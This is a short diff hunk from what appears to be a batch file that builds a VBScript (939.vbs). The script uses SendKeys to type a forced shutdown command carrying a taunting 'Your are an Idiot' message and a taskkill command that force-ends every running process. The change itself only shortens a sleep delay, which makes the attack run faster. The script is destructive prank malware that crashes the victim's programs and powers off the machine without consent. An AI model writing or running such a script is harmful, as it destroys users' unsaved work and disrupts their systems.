@@ -44,7 +44,7 @@ echo WScript.Sleep(1000) >>939.vbs
 echo x.SendKeys "shutdown /s /t 100 /c ""Your are an Idiot xaxaxaxaxaxa""" >>939.vbs
 echo WScript.Sleep(100) >>939.vbs
 echo x.SendKeys "{ENTER}" >>939.vbs
-echo WScript.Sleep(1000) >>939.vbs
+echo WScript.Sleep(250) >>939.vbs
 
 echo x.SendKeys "taskkill /F /FI ""STATUS eq RUNNING""" >>939.vbs
 echo WScript.Sleep(100) >>939.vbs
